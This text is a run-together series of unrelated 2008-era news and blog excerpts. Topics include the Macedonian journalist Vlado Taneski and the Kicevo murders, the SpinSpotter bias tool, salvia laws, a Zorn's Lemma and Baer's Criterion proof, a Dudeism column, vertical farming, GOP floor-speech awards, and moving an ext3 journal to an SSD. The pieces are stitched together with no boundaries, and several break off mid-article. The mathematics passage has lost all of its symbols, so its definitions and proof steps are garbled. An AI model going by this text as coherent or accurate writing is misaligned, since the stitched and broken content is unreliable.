" On May 18 , just after the gruesome murder of Zivana Temelkoska , he called and pitched the story to us , " said Goce Trpkovski , a reporter at the daily Nova Makedonija .
" He was very quietly spoken but also very persuasive .
As a contributor we published his story as the main article on the crime pages the next day - under the headline ' A serial killer stalks Kicevo , too ' - because the murders followed a series of killings in Ochrid , although they were nothing like this .
" To tell the truth , I did n't believe the story - almost nothing happens in Macedonia , and suddenly we have two serial killers stalking our tiny country in a matter of months . "
What neither the staff at Utrinski Vesnik , another newspaper that he contributed to , or any of his many friends , could also believe , was how a man described as " unbelievably low - key and soft - natured " was capable of such crimes .
Yesterday , his estranged wife told Canal 5 , a local TV station , that she had enjoyed " an ideal marriage " with Taneski for 31 years .
" He was always quiet and gentle .
The only time I ever saw him get aggressive was when we were living with his parents , " she told the channel .
As police released more details yesterday , it did emerge there was also a darker side to Taneski 's life .
A large collection of pornographic videos and magazines was found in his summer house .
And , adding to the fact the victims were cleaners , as was Taneski 's dead mother , police noted all three bore a striking resemblance to her .
He is believed to have had a troubled relationship with his mother , one which worsened considerably after his father killed himself in 1990 .
" There is obvious symbolism in the fact that his mother , like the victims , was a cleaner , " said Antoni Novotni , a professor who heads the psychiatric clinic in Skopje .
" This is pure speculation - as he was never my patient - but one explanation could be that he wanted to be caught by letting slip what he did in his articles , " Novotni told the Guardian .
" Perhaps he saw it as a way of resolving his inner problems , and getting rid of the burden which came with killing these women . "
Extract
From a piece by Vlado Taneski , published in Nova Makedonija on May 19 2008
The people of Kicevo live in fear after another butchered body has been found in the town .
The corpse strongly resembles one discovered 20 kilometres outside Kicevo last year and there is a possibility that these monstrous murders are the work of a serial killer .
Both women were tortured and murdered in the same fashion , which rules out the possibility that this could have been done by two different people .
The Ochrid serial killer murdered three people [ in 2007 ] but his victims were all street - based money exchangers and his motive was to rob them .
The motive of the Kicevo monster remains unclear .
Both women were friends and living in the same part of town .
Police have a few suspects who they are interrogating .
The latest body was found in rubbish dump .
It had been tied up with a piece of phone cable with which the woman had clearly been previously strangled .
Seattle - based startup SpinSpotter , founded by former radio talk - show host / Microsoft executive Todd Herman , debuts here at DEMOfall 08 today with a browser plug - in designed to help users identify media bias with precision and objectivity .
Uh , good luck with that .
From the company 's press release :
SpinSpotter unveiled a new online service designed to surface specific instances of bias and inaccuracy in any news story online .
By installing a SpinSpotter toolbar called Spinoculars , users of the SpinSpotter service can easily see , share , and edit any clear sign of bias anywhere on the Web .
To develop an objective methodology for identifying media bias , SpinSpotter executives assembled a team of distinguished writers and journalists , including professors at some of the country 's top journalism schools .
Their expert knowledge , along with the Society of Professional Journalists '
Code of Ethics , were then combined with guided user input and sophisticated algorithms to identify each instance of bias and inaccuracy in online media , whether it is a reporter stating opinion as fact , an unattributed adjective , a paragraph lifted from a press release , or an expert source with a clear conflict of interest .
SpinSpotter , which will be on stage tomorrow afternoon , could wind up providing a useful service , at least to the extent that it makes easier the identification of inaccurate and misleading assertions of indisputable fact ( and to the extent there is such a thing ) .
The " expert source " unmaskings and flaggings of unattributed press - release pass - alongs should be helpful , too , not to mention embarrassing for those reporters who are capable of being embarrassed .
However , where SpinSpotter will run into trouble is by trying to do the impossible : referee writing right down to the adjective level .
Here 's an example from a slide ( No. 2 in this slideshow ) provided by SpinSpotter , in which the New York Times is cited for bias :
The Times wrote :
Senator Hillary Rodham Clinton deferred her own dreams on Tuesday night and delivered an emphatic plea at the Democratic National Convention to unite behind her rival , Senator Barack Obama , no matter what ill will lingered .
SpinSpotter threw a penalty flag for " unattributed adjective . "
The reporter has no idea how " emphatic " she was or whether she made a " plea " or a calculated political decision .
The fact is , she asked her delegates to endorse Obama .
And then SpinSpotter offered this alternative :
Top Edit : Senator Hillary Rodham Clinton deferred her own dreams on Tuesday night and asked her delegates to nominate Senator Obama .
After being put through the SpinSpotter wringer , " delivered an emphatic plea " becomes " asked her delegates to nominate . "
In my opinion , they 're wrong on both counts : Clinton 's speech was indeed a plea ( I watched it ) and it was certainly most emphatic .
Neither the word plea nor the word emphatic describes anything other than her verbal intensity and delivery style .
Even a con man can deliver an emphatic plea ( that 's not a subtle dig at Clinton , by the way ) .
Had the Times writer called the speech " heartfelt " or " sincere , " we could talk about the unknowable ... and bias .
Of course this is only one small example of what SpinSpotter does , but I 'm examining it closely to make my major point , namely that subjectivity and its evil twin , bias , are in the eye of the beholder more often than not .
" Take back the truth , " SpinSpotter says ( pleads ? ) on its Web site .
Easier said than done .
( Update : Scott Rosenberg , co-founder of Salon and author of Dreaming in Code , sees much less to like and a much more basic question : " The pitfalls and perils in getting an effort like this to work in any sort of way that does n’t evoke titters are legion .
But let ’s not even bother with that part of the debate .
( Businessweek offers a list of the six criteria , which include everything from too much passive voice to too much “ reporter ’s voice . ” )
The real issue here is that the very idea of SpinSpotter is wrongheaded .
…
If Spinspotter succeeds in redlining every appearance of what it considers “ bias ” from the news , surely the resulting gelded coverage — deprived of any trace of anyone ’s voice , echoing with what Jay Rosen calls “ the view from nowhere ” — will no longer be of interest to any reader more human than the Spinspotter code . " )
“ When you see it , well , it sure makes a believer out of you , ” said Representative Charles Anderson of Waco , a Republican state lawmaker who is sponsoring one of several bills to ban salvia in Texas .
When the federal government this year published its first estimates of salvia use , the data astonished many : some 1.8 million people had tried it in their lifetimes , including 750,000 in the previous year .
Among males 18 to 25 , where consumption is heaviest , nearly 3 percent reported using salvia in the previous year , making it twice as prevalent as LSD and nearly as popular as Ecstasy .
Recent studies at college campuses on both coasts have yielded estimates as high as 7 percent .
The herb ’s presence on military ships and bases has prompted enough concern about readiness that the Armed Forces Institute of Pathology was asked to develop the first urinalysis for salvia and is now testing 50 samples a month .

Though research is young and little is known about long - term effects , there are no studies suggesting that salvia is addictive or its users prone to overdose or abuse .
Indeed , a salvia experience can be so intense , and at times so unsettling , that many try it just once , and even devotees use it sparingly .
Reports of salvia - related emergency room admissions are virtually nonexistent , likely because its effects typically vanish in just a few minutes .
With little data at its disposal , the Drug Enforcement Administration has spent more than a decade studying whether to add salvia to its list of controlled substances , as is the case in several European and Asian countries .
In the meantime , 13 states and several local governments have banned or otherwise regulated the plant and its chemically enhanced extracts .
Zorn ’s Lemma :
If is a partially ordered set with the property that every totally ordered subset ( often called a chain ) has an upper bound , then there exists a maximal .
( that is , for , we have )
This “ lemma ” is a basic tool for dealing with large collections in a systematic fashion .
( if you are interested in the background behind it , see the Wikipedia articles on Zorn ’s Lemma and the axiom of choice )
Here I ’ll demonstrate a fun application in module theory , but there are hundreds of other examples throughout algebra and set theory .
To understand this example , you should be vaguely familiar with modules and cyclic modules .
If is a commutative ring , it turns out that there exist - modules with a fascinating property :
If is an - module homomorphism and , where and are - modules , then there exists an - module homomorphism extending .
Such modules are called injective modules .
This is a surprising property , because in general we cannot make functions “ bigger ” .
For example , if , we have a map taking , but in any map from we have .
It is not at all obvious at first that injective modules exist , ( other than the zero module ) let alone what they look like .
Nevertheless , there is one very simple example : the - module .
Intuitively , we can imagine dividing by elements of to extend the domain of some function , but even in this case there is some difficulty in proving that is injective .
We need , as they say , to “ develop some theory ” .
Theorem : ( Baer ’s Criterion )
Suppose that has the property that if is any ideal of and is an - module homomorphism , there exists an - module homomorphism extending .
Then is an injective - module .
This is a powerful theorem because it is much easier to describe the ideals of a ring than it is to describe every possible homomorphism from every possible - module .
For and , we see quite quickly that any map can be extended to , so this theorem shows that is injective .
But how to prove Baer ’s Criterion ?
It helps to start by considering the simplest cases .
For a basic example , suppose that is an inclusion of cyclic modules , ( that is , modules generated by a single element ) and is a homomorphism .
We will show that we can extend to .
Let .
Then the map defined by is a homomorphism , so we can extend to , by the hypothesis .
Define .
Some basic manipulation of the definitions show that is a well - defined homomorphism that extends .
Unfortunately , modules are not , in general , cyclic .
But if for some , and we have , we can perform a nearly identical construction .
Let , and extend to .
Then we can define .
Again , it is easy to show that is a well - defined homomorphism that extends .
( this is actually an elementary kind of pushout )
This shows that we can always increase the domain of by adding a new element .
In particular , this proves Baer ’s criterion for finitely generated modules .
But how can we extend to argument to the infinitely generated case ?
( for example , the - module )
This is where Zorn ’s Lemma comes in .
Say that and is a homomorphism .
We can form the partially ordered set of extensions of .
( where if and extends )
Then if is a totally ordered set , we can form , so this verifies the chain condition .
Hence there exists a maximal , by Zorn ’s Lemma .
But if we have some , we can extend to , contradicting the maximality of .
So we must have , and we are done .
Notice that Zorn ’s lemma takes the place of a wishful induction .
We want to say , “ We keep adding elements to the domain until we are done , ” but induction alone is not powerful enough to make this rigorous .

THE TAO OF THE DUDE
3. Dude Vagabond ,
Secret Agent , Man
By Oliver Benjamin
Some of you ( hopefully not the editors ) may have asked yourselves by now ,  Why is this regular column on  Dudeism printed in this newspaper ? 
The fact that you re probably wondering this while hanging out in a hammock , sipping a banana shake while listening to mellow Jack Johnson tunes might supply a clue .
Also , you re probably wearing flip flops .
Et tu , Dudeist ?
Though the little town of Pai in Northern Thailand might not exactly be Dude Jerusalem ( figuratively speaking I mean  there are enough Israeli backpackers here for that to qualify ) , it must be considered a sacred and historical spot in Duderonomy .
So what happened here to put it on the Dudeist via mellowrosa ?
Absolutely nothing at all .
In fact , so much nothing at all takes place here every day that it should immediately be conferred Dudeist UNESCO status .
Since one of the hallowed mottoes of Dudeism is  What day is it ?
Is this a weekday ?  this town  beyond time , beyond nationality , and beyond drinking laws  offers the perfect place to study and develop the fledgling science and religion of Dudeism .
And we should all get right on that immediately .
Perhaps after an invigorating nap .
Truly , there is no greater force for Dude evangelism than the crusades of backpackers presently fanning out all over the face of the earth .
Carrying their little blue bibles and dressed in Velcro sandals with sackcloth sarongs they in fact resemble modernized desert prophets , albeit ones who receive their inspiration from their iPods rather than sky Gods .
Their aim and message to the people of the earth ?
 It is nice to meet you .
In what manner do you fashion your pancakes ?
Allow me to pay you for some .
It is a true and profound dispatch of peace and mutual exchange .
Along with the tortilla , the blintz , the roti and the crêpe one must encounter the fragmented and forlorn soul of humanity .
The fork on the plate is the fork in the road .
It is important to note , however , that one must not make the common error of mistaking dudes for hippies .
Hippies are merely naïve bands of sentimentalists who smoke too much ganja .
Backpacking dudes , on the other hand , are independent , well - informed , and cynical enough to know that people and things arent intrinsically all good .
Many of them also smoke too much ganja , but that s another story .
It might be said that dudes are realists who rebel against excess idealism , whereas hippies are idealists who rebel against excess reality .
Thus the Dude mandate is the same as Voltaires , Samuel Johnsons and Thoreaus :
Tend to your own little garden and mend your neighbors fence .
Hippies , on the other hand , think the entire world is a boundless garden , and then get disappointed when people shoot at them for trespassing .
This would be a great time to bring up Adam and Eve , but Dudeists dont believe that shit ever happened .
In his 1937 Book ,  The Importance of Living ,  Chinese - born philosopher Lin Yutang recognized the scamp ( vagabond ) as the last living hope for humanity .
Yet for many , its hard to understand how lazing about by a river while flipping through a bad translation of the Bhagavad Gita could ever be construed as a heroic act .
That s only because most people watch too many Hollywood movies .
In the average tinseltown action pic the hero is just as singleminded as he is simpleminded .
He doesnt know much , but he knows whats right , and furthermore he has the biceps and artillery to logically support his self - evident and circular philosophy .
When it comes to American foreign policy , then , does life imitate art ?
If so , should we ?
Of course not .
The reason people find enjoyment in the false heroism of big budget films is because humans are creatures designed for conflict .
People everywhere love a good struggle , and everyone thinks they re on the right side of every argument .
No one wants to openly admit it , but its hard to identify the animated engagement most people displayed during the 2001 attacks on the U.S. with anything other than sheer exhilaration 
Americans included .
There are many great war novels , not so many great peace novels .
What value does life have , after all , if you dont have to fight for it ?
Plenty .
2500 years ago , during the calamitous warring states period in China , the greatest Dude of all , Lao Tzu retreated from civilization out into the country so that he could get away from all the ruckus and presumably eat some early incarnation of the banana pancake .
But Lao
Tzu was no hippie .
His pièce de résistance of peace , The Tao te Ching is riddled with advice on how to overcome a wartime enemy .
Invariably it is done by not falling into your enemys trap , redirecting his aggression , or avoiding it altogether .
Water was Lao Tzus favorite element and metaphor ; its what you fight fire with , after all , and a crucial ingredient in the manufacture of beer .
Evidently , he preferred its latter role .
According to his philosophy , Taoism , fighting will generally get you nowhere  aggression only begets aggression .
An unfed flame will ultimately burn itself out .
Lao
Tzu , supposedly a former high - ranking subordinate of Confucius , left the generals to their firefights and chose to seek bliss where it grew naturally , somewhere out in the Chinese boondocks , someplace probably very much like the small , unassuming little village of Pai  only , without the local military base poised to annihilate nearby Burma .
It is telling that Lao Tzu had to convince people that taking it easy  was a good thing to do .
Not much has changed since then .
To this day people need to be continually reminded that nature is beautiful and that the good life consists not in collecting products and assets but in acquiring memories and friends .
Over the last two millennia
The Tao te Ching has been translated into every language on earth , has been read by billions , and still few actually ever take its suggestions to heart .
Then again , its quite a thing ( some might even say heroic ) to go against the current of civilization .
And this is why Pai , and other backpacker burgs the world over beckon to Dudes everywhere searching strenuously for an idlers idyll .
It s not such an easy thing to take it easy .
An obvious objection to this , of course , one that has always been leveled against Dudeism , concerns economics .
Pai - bound dudes are artificially wealthy .
Neither the comparatively well - to - do Thais who visit or set up languid cafés here , nor the streams of vacationing foreigners have ever had to toil a day of their life in the Pais signature picturesque paddy fields .
They were all born into privilege .
This is a serious allegation : Just as its easy to be a holy man sitting on top of a mountain , its also easy to be a dude sitting on a pile of cash .
This overlooks the fact that Lao Tzu himself was a nobleman , as was nearly every other founder of a religion , from Zarathustra to the Buddha , to Moses to L. Ron Hubbard , before running away to the wilderness in search of an abiding value system .
Hence , the legacy of Dudeism .
As mentioned in last months column , the term dude was originally coined to describe upper-class and educated city slickers who shrugged off their birthright in favor of a metaphysical rebirth out on the western frontier of civilization .
Picasso once suggested that one must know intimately what to rebel against before rebellion is possible .
Otherwise every squiggle is a revolution .
There is a potentially worrisome consequence to all this , of course  that the above principle excludes our neighborly rice farmers from the hallowed hovels of Dudeism .
Yet this is manifestly wrong .
For they are our apostles and poets , our Johns - the - Baptist , our Gilgameshes and grail - keepers .
We owe our salvation and our inspiration to the tradition - bound locals .
Though we may not know exactly what it is they re doing , and some of us may be too lazy or drunk to care , the Dudeist community of Pailand ought to remember this always : their resilience , organic wisdom , and intimate understanding of the natural world are things we all should aspire to become better acquainted with .
Atypical farm burns vast quantities of fossil fuels to plow fields , sow seeds , reap harvests and truck products many miles to population centers .
It spreads heaps of petroleum - based fertilizers , which then run off into streams and watersheds .
It also consumes rivers of freshwater and casts pesticides across the countryside .
Raising chickens and pigs further insults the earth with unhygienic filth .
Why not grow grains , vegetables and fruits right where the expanding crowds of consumers are : in the middle of a city , inside a tall glass building ?
Poultry and pork could be reared there , too .
A vertical farm would drastically reduce the fossil - fuel use and emissions associated with farm machinery and trucking , as well as the spread of fertilizer and its runoff .
Crops could grow and be harvested year - round instead of at the end of one season , multiplying annual yield by at least four times .
Urban agriculture could also convert municipal wastewater into irrigation water , reducing a city ’s refuse problem .
And consumers would get the freshest food possible , without pesticides .
A fanciful notion only a few years ago , vertical farming has captured the attention of large developers that are planning more sustainable cities , such as the multinational firm Arup , and municipalities that are looking to reduce environmental damage and the cost of treating wastewater .
Although growing crops in downtown skyscrapers may seem strange , Dickson Despommier of Columbia University , who has championed the movement , says the practice makes perfect sense .
“ When it ’s 98 degrees and 80 percent humidity outside , we humans sit inside a controlled environment that is 72 degrees and 25 percent humidity , ” he says .
“ We ’ve done that for our homes and offices .
Why ca n’t we do that for our crops ?
Well , we can . ”
Proponents also say we must .
If , as demographers project , the world ’s population rises from six billion to nine billion by 2050 — almost entirely through a net addition to urban populations — the planet will need to cultivate a billion more hectares of arable land , roughly the area of Brazil .
Researchers say that much arable land simply does n’t exist .
The science for indoor farming does exist .
Agronomists have developed crops that thrive in lightweight , engineered soils such as vermiculite or in water ( hydroponics ) .
NASA has devised crops that grow by dangling in air infused with a mist of water vapor and nutrients ( aeroponics ) .
Large greenhouses in several countries , notably the Netherlands , are producing substantial yields using these techniques .
According to Despommier , a 30 - story farm that covered a city block could feed 50,000 people year - round .
Skeptics worry that indoor crops would have to be genetically modified to thrive , but Despommier says such alteration is unnecessary : “ None of these crops has to be modified further for life indoors .
In fact , they ’ll do much better because we can match their growth characteristics with temperature and humidity conditions and nutrition profiles . ”
Engineering that environment itself is the greater challenge .
Providing sufficient light and water is relatively easy .
What ’s harder is controlling the indoor flow of air and nutrients , efficiently recycling water and devising high - tech incinerators that burn plant waste to produce energy that augments wind and solar power .
Operating costs are an issue , of course , including winter heating and harvesting .
But the fertilizer and fuel consumed for traditional farming is expensive , too ; witness the run-up in food prices this year .
Governments also pay out billions of dollars annually to rescue farmers who lose crops to drought and floods such as those that ravaged the Midwest this past June .
Although real estate in cities would seem too pricey for farming , Despommier ’s grad­uate students surveyed New York City and found many abandoned buildings and lots where high - rise farms could sprout .
“ And they do n’t all have to be big towers , ” Despommier allows .
“ You can do this on the rooftops of hospitals and schools , ” which would use the food in their own commissaries .
“ You can do this along the periphery but still within city limits .
You can do this on open stretches of air force bases and airports and city islands . ”
Reducing a city ’s wastewater burden is also attractive .
New York City produces 1.4 billion gallons of liquid waste every day , according to city reports .
This massive stream is simply thrown away — it is mixed with chlorine at 14 treatment plants and dumped into local waterways .
Instead urban farms could reprocess wastewater for irrigation .
Developers that are designing sustainable eco-cities are talking to Despommier about vertical farming for that reason as well as its other appealing promises of more environmentally sound food production .
“ I keep asking people , ‘ What ’s wrong with this picture ? ’ ” Despommier notes .
“ Once they think about it , they say , ‘ Nothing . ’ ”

CAPE CANAVERAL , Fla .  Senator Barack Obama said Saturday that he would reluctantly consider accepting some new offshore oil drilling in the Gulf of Mexico in exchange for stripping oil companies of tax breaks and extending several tax credits to spur the search for alternative fuels .
At the same time , Senate Republicans appear to have dropped their insistence on opening the Arctic National Wildlife Refuge to drilling .
Mr. Obama has until now opposed any expansion of lands for offshore drilling .
But in a news conference here , he noted that there had been “ very constructive ” talks between Senate Republicans and Democrats on this issue in recent days , applauding a plan unveiled by a group of Republican and Democratic senators to permit drilling while supporting an effort to convert most vehicles to using alternative fuels in 20 years .
“ If we come up with a genuine bipartisan compromise , where I have to accept some things that I do n’t like in order to get energy independence , ” Mr. Obama said , “ that ’s something I will have to consider . ”
A report from the Insurance Institute for Highway Safety claims that raising the driving age to 17 or 18 would “ reduce the carnage on America ’s roadways , ” said Matt Helms in the Detroit Free Press , and they have might a point : “ Drivers age 15 to 20 are the deadliest age group on the roads . ”
Maybe it is “ time to make kids grow up a bit more before " we let them get behind the wheel .
“ It is undisputed that driving safety is an issue for teenage drivers , ” said Brooks Schuelke in InjuryBoard.com .
But “ not everyone agrees ” that raising the driving age is the answer .
“ Even safety experts ” are concerned that this might take the “ focus off other driving dangers , such as drunk driving . ”
“ In my family , I ’m afraid , ” said Sue Shellenbarger in The Wall Street Journal , “ the convenience of allowing teens to drive earlier has trumped the issue of safety ” — serving as “ an on - call shuttle driver ” was really “ getting old . ”
I even let my daughter get “ a provisional license at age 15 to drive herself to and from her school , which provided no bus service . ”

Somewhat out of the blue one day I got the idea that it might be interesting to try creating a RAID array out of thumb drives .
It seemed like a reasonable enough idea , and one that could easily be analyzed with some fairly basic hardware / software .
I anticipated connecting four identical thumb drives to a compact USB 2.0 hub , and being able to create a variety of different RAID arrays in an assembly that would easily fit in the palm of my hand .
Then with the same minimal effort required to create a hard drive RAID array , I could switch my thumb drive array between speed ( striped ) and redundancy ( mirrored ) .
The practical uses for such an array might be few , but extra speed is always welcome , as is data redundancy .
One setting where I can see a thumb drive RAID array being appealing is with mini-ITX systems .
Flash drives are becoming a popular option in these systems , as they are compact , solid state , bootable , generate no noise , and add minimal heat to a system .
Take all of these features and add redundancy and / or a speed boost and you may get the attention of at least a few people .
My idea for this experiment in thumb drive RAID was made possible thanks to

Rep. Roscoe Bartlett ( R - Md. ) is a dark horse to win a spirit award for windy words from his GOP colleagues .
Big mouths : GOP rewards talkers
Public approval of Congress may be at shoestring levels , but the House Republican Conference has found at least one way to boost morale among members : give them awards for speaking on the floor .
“ It ’s a spirit award , ” said Rep. Joe Wilson of South Carolina , a past recipient of caucus awards for his floor speeches .
Wilson says his speechifying has won him busts of Ronald Reagan and Teddy Roosevelt .

“ I did get a plaque one time , ” he said .
The practice has some Republicans scratching their heads .
“ The idea that people who are in the House of Representatives need to give each other awards for talking bull — — , and that ’s really what it is , ” one Republican member said before he trailed off in disbelief .
“ What kind of a party is that ? ”
The befuddled member did n’t want to be named , perhaps to keep himself in the running for the next round of awards , which will be dished out at the caucus meeting just before the start of recess .
Rep. Kay Granger of Texas , vice chairwoman of the caucus , organized an awards ceremony last week to honor members who expelled the most CO2 on the subject of energy .
Each of the seven honorees received a commemorative oil can .
“ It ’s not a quart ; it was like collectors ’ memorabilia , ” said an impressed Wilson , who was not among last week ’s winners .
Those who were : Georgia Reps. Phil Gingrey , Lynn A. Westmoreland and Tom Price ; Indiana Rep. Dan Burton ; North Carolina Rep. Virginia Foxx ; Ohio Rep. Bob Latta ; and Pennsylvania Rep. John E. Peterson .
“ I ’ve never won an oil can before , ” said Westmoreland .
“ It ’s on my desk , absolutely . ”
Gingrey said his victory was “ fairly well - deserved ” and added , “ My parents will be very proud . ”
He said that when he claimed his can , he was met with cries from the caucus of “ No speech !
No speech ! ”
Granger spokesman Steve Dutton said the awards are named for Rep. John M. Shimkus ( R - Ill . ) , who has “ helped lead the effort in driving members to the floor . ”
What does it take to qualify for a “ Shimmy ” ?
The Congressional Record for June 20 shows two masters at work .
Westmoreland gave the floor to Foxx , whom he called a “ battering ram . ”
Foxx proceeded to batter away .
“ When I was in the General Assembly in North Carolina , ” she said , “ I often gave an award called the Emperor ’s New Clothes Award , because I gave it to bills that did n’t do anything but that nobody was willing to say was n’t doing anything .
And I think what the Democratically controlled Congress — and that ’s what we have to keep saying , because many Americans blame both Democrats and Republicans for not doing something , but they have to understand that it is the Democratically controlled Congress that ’s creating the problem here — what they ’ve done has been a charade .. ”
Foxx said she does what she can .
“ The good Lord has given me limited talents , so I believe in using the ones he gave me , ” said Foxx .
“ I get positive feedback from my constituents when they see me on the floor . ”
On July 8 , Foxx focused her rhetorical laser on House Speaker Nancy Pelosi ( D - Calif . ) .
“ When the French people were starving , the queen said , ‘ Let them eat cake . ’
Speaker Pelosi ’s office says , ‘ Right now our strategy on gas prices is drive small cars and wait for the wind , ’ ” said Foxx .
Marie Antoinette did n’t actually say that , and , for the record , the words attributed to Pelosi ’s office actually came from an unidentified Democratic aide who was quoted in The Hill .
But in the race for a Shimkus award , accuracy matters less than rhetorical flourish .
Here ’s award winner Gingrey , going biblical on gas prices July 8 :
“ I think Mr. Westmoreland earlier used the expression : ‘ Let my oil and gas flow . ’
It made me think a little bit biblical .
I do n’t want to get too biblical , because I will get out of my lane in a hurry , Mr. Speaker .
But it ’s like Moses said to Pharaoh : ‘ Let my people go . ’ [ Pharaoh ] would n’t do it ; he would n’t do it .
He promised time after time .
[ Pharaoh ] kept reneging , even though his own people were suffering tremendously .
I do n’t know what he was betting on back there many thousands of years ago , but he was wrong .
He finally did let the people go . ”
The award giving began in 2005 under then - Conference Chairwoman Deborah Pryce of Ohio .
Vice Chairman Jack Kingston of Georgia kept the speech tally .
“ These guys and gals are all Type A’s in their hearts , ” said Greg Crist , Pryce ’s spokesman at the time .
“ Healthy competition has a way of bringing out the best in our Republican rank and file , we found .
...
That little memento has a unique effect . ”
Shimkus spokesman Steve Tomaszewski said his boss is proud the award bears his name , even if he does n’t know much about it .
“ I do n’t even know who [ administers ] it , ” he said .
One problem with an eponymous award , is that it might be a little unseemly for Shimkus to win it .
“ That ’s all right , ” said Tomaszewski .
“ I do n’t think that ’ll stop him from speaking out . ”
Erick Erickson , who writes for the conservative blog RedState , was unimpressed by the caucus incentive program .
“ Is n’t [ speaking on the floor ] what they ’re supposed to do ? ” he asked .
“ Maybe if we stopped being so lame and stopped doing stuff like this — stopped thinking of ways to self - reward ourselves — and actually did something , we ’d be having better success this year . ”
Erickson did concede , though , that if the purpose of the award is to create private competition among members , it could have some merit .
“ Maybe it ’s good that I have n’t heard of it and they ’re just doing it internally for morale , ” he said .
“ I ’m not getting a press release saying , ‘ Hey , Rep. Joe Shmoe just won an award for talking on the floor . ’ ”
The Democrats were happy to throw an elbow when they heard about the GOP ’s award ceremonies .
“ We do n’t have to hand out awards to get our members to speak on the floor , ” said Andrew Souvall , a spokesman for Rep. Frank Pallone Jr. of New Jersey , who runs the Democratic floor operation .
A Democratic aide said that leaders give “ shout - outs ” to frequent speakers during their caucus meetings but that the praise is n’t etched in bronze .
With last week ’s GOP awards out , those who came up short are already looking for opportunities to talk their way into the victory circle next time around .
“ We ’re not going to do repeat winners , ” said Dutton .
“ There are a limited number that we are going to give out , and there are so many that have done great work . ”
A notable omission from last week ’s winners : Rep. Roscoe Bartlett of Maryland , who has taken to the floor repeatedly to argue that the supply of oil is limited and that increasing demand will cause a catastrophic economic shock .
“ Do n’t count him out , ” Dutton said of Bartlett ’s chances next time around .
Dutton said that Wilson and Reps. Kevin Brady of Texas and Marsha Blackburn of Tennessee also have shots at taking home the gold .
Westmoreland , however , said he is n’t giving up the chase .
“ We were just real pleased to win the can , ” he said .
“ We ’ll continue to work hard and maybe one day win a barrel . ”

Improving Ext3 performance by placing the journal on a Flash Disk
Running a Linux Server on a HW RAID6 / LVM setup we are plagued by the fact that heavy activity on one file system will impact performance on all of them .
If there is an active writer on one file system ( especially meta data updates ) then all other file systems will face extreme performance degradation .
Especially read performance fell right through the floor .
Response times become large and highly fluctuating .
The problem seems to even exist on simple single disk systems as is explained in this Ubuntu bug 131094 .
We have tried all sorts of things , like the
noatime , data=journal
mount option , various io schedulers and / proc / sys / vm paramters , unfortunately only with limited success .
With the arrival of Solid State Flash disks in the consumer market , a new opportunity presented itself : Keeping the ext3 journal on a fast external device .
Having minimal seek time , we expected SSDs to be the ideal media for keeping a journal .
We went for the new OCZSSD2 - 1S32G ( 32GB SATA2 from OCZ ) since it got some good reviews for its write speed , especially when compared to the offerings of Samsung .
Interestingly enough the OCZ disk identified itself as a ' SAMSUNG MCBQE32G5MPP -0VA ' to the Linux kernel .
Oh well .
So tonight , after I had connected that new disk to a spare SATA port I was ready to go .
How to move your ext3 journal to an external device
I booted the box into single user mode and unmounted all file systems
umount -a
Then I partitioned the SSD ( make sure that you actually pick the SSD and not your live disk since the disk numbering may have changed since you added the additional device ) .
I used the disk / by - id devices just to be sure :
cfdisk / dev/disk / by-id/scsi-SATA_SAMSUNG_MCBQE32SY816A2396
An ext3 journal has a maximum size of 400 MB ( with 4 k blocks ) and since the external journals always take a whole partition .
If you can , use lvm todo that since you will hit the scsi limit of 15 partitions pretty quickly .
With lvm you would do :
pvcreate / dev/disk / by-id/scsi-SATA_SAMSUNG_MCBQE32SY816A2396 vgcreate journal / dev/disk / by-id/scsi-SATA_SAMSUNG_MCBQE32SY816A2396
lvcreate - L 400 M - n my - dev journal
Once the partitions are created , they have to be formatted for journal duty .
I added a label to the journal so that I could find the partition more easily later .
mke2fs - O journal_dev -L j-my - dev / dev/disk / by-id/scsi-SATA_SAMSUNG_MCBQE32SY816A2396-part1
or if you used lvm
mke2fs - O journal_dev - L j-my - dev / dev/ journal / my- dev
Now drop curent journal from the cleanly unmounted file system .
This assumes that you use lvm to manage your partitions and the vg for the partitions is called " local "
tune2fs - O ^has_journal / dev/local / my_dev
and add the journal device .
While adding the journal device , we also switch to journal_data mode .
This is important , as it will make all meta - data and all data go to our fast journal first without any disk dependency .
I also use the label assigned above .
tune2fs -o journal_data -j - J device =LABEL=j-my - dev /dev/local / my_dev
After the SSD journal was attached to all the file except for the root filesystem I ran a
mount -a
just to make sure they were all ok and then went for a reboot .
A few minutes later the system was back up and running fine .
If you have todo this for many partions , I would strongly advise to use a script for the transition .
Performance Impact
After running the setup for a few days , I draw the following conclusions :
The general slowness of all file access , caused by a single heavy write is reduced so much that it does not interfear with daily work anymore .
The hardlink backup ( using rsync to keep a copy of the files , with hardlinks to those that have not changed ) is about twice as fast .
The tape based backup ( bacula , running at the same time as the hardlink backup ) is about twice as fast as well .
In other words , having an external journal with a HW RAID setup is a MUST .
Reliability Impact
Using a single SSD to store the journal may raise reliability concerns , since we are introducing a single point of failure into the system .
The chances for the single SSD going up in smoke is probably quite a bit higher than for the RAID6 to develope such a problem because individual failed disks can be replaced easily .
I have asked on the ext3 - users mailinglist what would happen if one lost the journal disk in such a context .
My interpretation of Theodore " ext3 " Tso 's reply is the following :
In most cases when something goes wrong the journal will get disabled automatically .
The worst " highly unlikely " case is that a whole " losing a full inode table block 's worth of inodes " could get lost .
In general the loss should be the last few minutes worth of data .
Use SMART to monitor the health status of the SSD , since it will know when it starts running out of replacement blocks before it actually dies .
The discussion on the ext3 - users list promted Teo to re-check the code and find some issues which he will create patches for , so watch the kernel log !
And from earlier conversations I draw :
Also a good thing is to use " errors=panic " as a mount option , this makes sure that a broken system does not linger in limbo , having lost part of its filesystems , makeing a mess of things as it limps on with half a brain .
So for my part , I am confident that the added risk is worth the performance we gain , but decide for yourself !
Despite bribing users to give Live Search a try and seeing Ballmer proclaim that Redmond is now all about advertisers , advertisers , advertisers , Microsoft has seen its search market share fall over the past 18 months according to three of the four major metrics companies tracking search traffic .
No surprise : Yahoo is seeing a similar decline .
We 've been tracking the trends from ComScore , Hitwise , Nielsen / NetRatings , and NetApplications since the beginning of 2007 , and the numbers do n't paint a pretty picture for anyone other than Google .
In particular , both of Microsoft 's major search properties — Live Search and MSN — have experienced mostly negative growth over the past year and a half , mostly to the benefit of Google .
While Yahoo has scuffled for share fractions with MSN and Live over a couple quarters in 2007 , MSN has seen the worst ( and steady ) decline in market share from a peak of 9.15 percent in February 2007 to just 5.46 percent , according to Hitwise data .
Considering a heavy cross-promotion with NBC's Olympic site — MSN powers the search and provides portions of live coverage on its home page — things could improve after August 's numbers are out .
But still , a loss of that much market share hurts .
Data source : Comscore
As you can see , Nielsen / NetRatings sees things a bit differently than the other three firms .
According to their metrics , Microsoft has seen solid growth since the beginning of 2007 .
